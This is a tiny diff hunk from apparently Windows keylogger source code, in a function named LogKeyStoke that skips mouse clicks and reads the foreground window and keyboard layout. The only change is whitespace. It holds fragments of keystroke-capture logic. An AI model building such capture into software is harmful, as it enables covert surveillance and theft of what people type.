@@ -51,7 +51,7 @@ void LogKeyStoke(std::ostream* out, DWORD key_stroke)
 
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return; // ignore mouse clicks
-
+	
 	HWND foreground = GetForegroundWindow();
 	DWORD threadID;
 	HKL layout = NULL;
